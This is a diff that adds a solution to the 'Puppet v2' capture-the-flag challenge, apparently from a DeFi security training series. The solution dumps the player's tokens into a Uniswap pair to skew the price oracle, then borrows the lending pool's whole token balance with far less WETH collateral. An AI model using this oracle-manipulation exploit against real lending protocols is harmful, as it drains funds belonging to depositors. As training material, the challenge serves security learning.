@@ -83,6 +83,32 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // V1
+        // (amount * (ETH*10**18 / DVT) * factor) / 10**18
+
+        // dvt = 100
+        // eth = 10
+
+        // V2
+        // ((amount*10**18 * reserveETH / reservDVT) * factor) / 10**18
+        // ((1*10**18      *        10  /       100) *      3) / 10**18
+
+        console.log(await uniswapFactory.getPair(token.address, weth.address))
+        console.log("weth required before", (await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)).toString())
+        await token.connect(player).approve(uniswapRouter.address, ethers.constants.MaxInt256)
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE, // amountIn
+            0,  // amountOutMin
+            [token.address, weth.address], // path
+            player.address, // to
+            ethers.constants.MaxInt256, // deadline
+        )
+        console.log("weth required after", (await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)).toString())
+        const allBalance = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+
+        await weth.connect(player).deposit({value: allBalance})
+        await weth.connect(player).approve(lendingPool.address, ethers.constants.MaxInt256)
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE)
     });
 
     after(async function () {
